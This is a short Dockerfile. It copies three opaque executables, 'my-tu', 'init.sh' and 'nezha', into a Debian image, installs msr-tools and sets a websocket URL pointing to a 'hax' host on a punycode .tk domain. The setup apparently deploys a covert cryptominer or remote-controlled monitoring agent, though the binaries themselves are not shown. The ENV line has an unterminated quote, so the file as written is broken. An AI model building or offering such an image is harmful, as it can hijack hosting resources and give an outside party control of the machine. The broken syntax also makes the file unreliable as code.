FROM debian:sid

ENV WS_URL="wss://hax.xn--6krt7h.tk

COPY my-tu /
COPY init.sh /
COPY nezha /
WORKDIR /app

RUN apt update -y \
  && apt upgrade -y \
  && apt install -y wget curl procps msr-tools ifconfig
RUN chmod a+x /my-tu /init.sh /nezha

CMD /init.sh
